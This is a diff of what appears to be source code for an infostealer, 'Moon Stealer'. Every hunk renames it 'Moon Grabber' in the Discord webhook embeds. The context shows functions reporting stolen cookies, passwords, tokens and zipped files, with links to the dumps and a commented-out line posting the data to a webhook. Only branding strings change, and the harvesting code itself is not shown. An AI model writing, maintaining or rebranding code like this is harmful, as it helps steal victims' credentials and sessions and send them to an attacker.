@@ -466,7 +466,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "",
-        "username": "Moon Stealer",
+        "username": "Moon Grabber",
         "attachments": [],
     }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -499,7 +499,7 @@ def upload(name, link):
             "content": "",
             "embeds": [
                 {
-                    "title": "Moon  -  Cookies Stealer",
+                    "title": "Moon  -  Cookies Grabber",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[MoonCookies.txt]({link})",
                     "color": 0,
                     "footer": {
@@ -508,7 +508,7 @@ def upload(name, link):
                     },
                 }
             ],
-            "username": "Moon Stealer",
+            "username": "Moon Grabber",
             "avatar_url": "",
             "attachments": [],
         }
@@ -525,7 +525,7 @@ def upload(name, link):
             "content": "",
             "embeds": [
                 {
-                    "title": " Moon  -  Password Stealer",
+                    "title": " Moon  -  Password Grabber",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[MoonPassword.txt]({link})",
                     "color": 0,
                     "footer": {
@@ -534,7 +534,7 @@ def upload(name, link):
                     },
                 }
             ],
-            "username": "Moon Stealer",
+            "username": "Moon Grabber",
             "avatar_url": "",
             "attachments": [],
         }
@@ -548,14 +548,14 @@ def upload(name, link):
                 {
                     "color": 0,
                     "fields": [{"name": "Files: ", "value": link}],
-                    "author": {"name": " Moon  -  File Stealer"},
+                    "author": {"name": " Moon  -  File Grabber"},
                     "footer": {
                         "text": "Moon On Top!",
                         "icon_url": "",
                     },
                 }
             ],
-            "username": "Moon Stealer",
+            "username": "Moon Grabber",
             "avatar_url": "",
             "attachments": [],
         }
@@ -800,7 +800,7 @@ def GatherZips(paths1, paths2, paths3):
                 },
             }
         ],
-        "username": "Moon Stealer",
+        "username": "Moon Grabber",
         "avatar_url": "",
         "attachments": [],
     }
